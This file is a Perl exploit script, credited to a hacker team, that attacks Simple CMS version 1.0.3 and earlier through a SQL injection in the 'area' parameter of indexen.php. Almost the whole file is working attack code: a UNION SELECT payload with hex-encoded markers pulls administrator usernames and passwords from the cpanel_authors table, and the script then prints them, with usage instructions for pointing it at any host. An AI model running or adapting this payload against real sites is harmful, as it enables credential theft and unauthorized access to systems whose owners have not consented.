#!/usr/bin/perl

# Simple CMS <= 1.0.3 (?area=) Remote SQL Injection Exploit
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team / Sys - Project
# http://www.spanish-hackers.com
# special thanks to ka0x


print "\t\t########################################################\n\n";
print "\t\t#   Simple CMS <= 1.0.3 Remote SQL Injection Exploit   #\n\n";
print "\t\t#                       by JosS                        #\n\n";
print "\t\t########################################################\n\n";

use strict;
use LWP::UserAgent;

my $victim = $ARGV[0];

 if(!$ARGV[0]) {
    print "\n[x] Simple CMS <= 1.0.3 Remote SQL Injection Exploit\n";
    print "[x] written by JosS - sys-project[at]hotmail.com\n";
    print "[x] usage: perl xpl.pl [host]\n";
    print "[x] example: http://localhost/path/\n\n";
    exit(1);
 }
 
    print "\n[+] connecting in $victim...\n";
    my $cnx = LWP::UserAgent->new() or die;
    my $go=$cnx->get($victim."/indexen.php?area=-1+union+select+1,concat(0x5f5f5f5f,0x5b215d20757365723a20,UName,0x20205b215d20706173733a20,PWord,0x5f5f5f5f),3,4,5+from+cpanel_authors/*");
    if ($go->content =~ m/____(.*?)____/ms) {
        print "$1\n";
    } else {
        print "\n[-] exploit failed\n";
    }

